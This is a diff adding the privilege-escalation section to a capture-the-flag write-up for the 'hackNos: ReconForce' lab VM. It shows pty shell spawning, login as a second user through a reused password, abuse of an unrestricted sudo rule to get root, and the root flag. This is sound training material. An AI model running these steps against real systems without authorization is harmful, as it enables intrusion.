@@ -24,6 +24,8 @@
   * Login In / Command Injection
   * Shell as www-data
 * 0x03 Privilege Escalation
+  * www-data -> recon
+  * recon -> root
   
 # 0x00 Quick Summary
 hackNos: ReconForce was a quite easy box, took me around 1day to root it because i was using the broken version. The mistake takes place at FTP Banner, it should be `Security@hackNos` & not `Secure@hackNos`. I wasted lot of time brute forcing the HTTP Authentication, when i got the patched version i was able to root it into 10 minutes. FTP Banner provide us the HTTP Authentication password, when we login in we can see a ping function, we need to bypass it & take command injection. Then we have to do 2 privilege escalations, very easy ones.
@@ -190,3 +192,78 @@ www-data@hacknos:/var/www/recon/5ecure$
 ```
 
 # 0x03 Privilege Escalation
+## www-data -> recon
+
+Really simple we try the `Security@hackNos` as password for recon and it works!
+
+
+```
+www-data@hacknos:/home$ python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@hacknos:/home$ su - recon
+su - recon
+Password: Security@hackNos                            
+
+recon@hacknos:~$ whoami
+whoami
+recon
+recon@hacknos:~$ 
+```
+
+## recon -> root
+
+As always i check the `sudo -l` so :
+
+```
+recon@hacknos:~$ sudo -l
+sudo -l
+[sudo] password for recon: Security@hackNos
+
+Matching Defaults entries for recon on hacknos:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User recon may run the following commands on hacknos:
+    (ALL : ALL) ALL
+```
+
+We can run all commands as root perfect.
+
+```
+recon@hacknos:~$ sudo bash
+sudo bash
+root@hacknos:/home/recon# whoami;id
+whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+root@hacknos:/home/recon# 
+```
+
+We can read the flag now.
+
+```
+root@hacknos:/home/recon# cat /root/root.txt
+cat /root/root.txt
+     $$\          $$$$$$$\                                          
+     \$$\         $$  __$$\                                         
+$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\  
+\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ 
+$$$$\  $$  |      $$  __$$< $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
+\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
+     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
+     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|
+                                                                    
+                                                                    
+                                                                    
+
+MD5HASH: bae11ce4f67af91fa58576c1da2aad4b
+
+Author: Rahul Gehlaut
+
+WebBlog: www.hackNos.com
+
+Twitter: @rahul_gehlaut
+root@hacknos:/home/recon# 
+```
+
+PWNED!
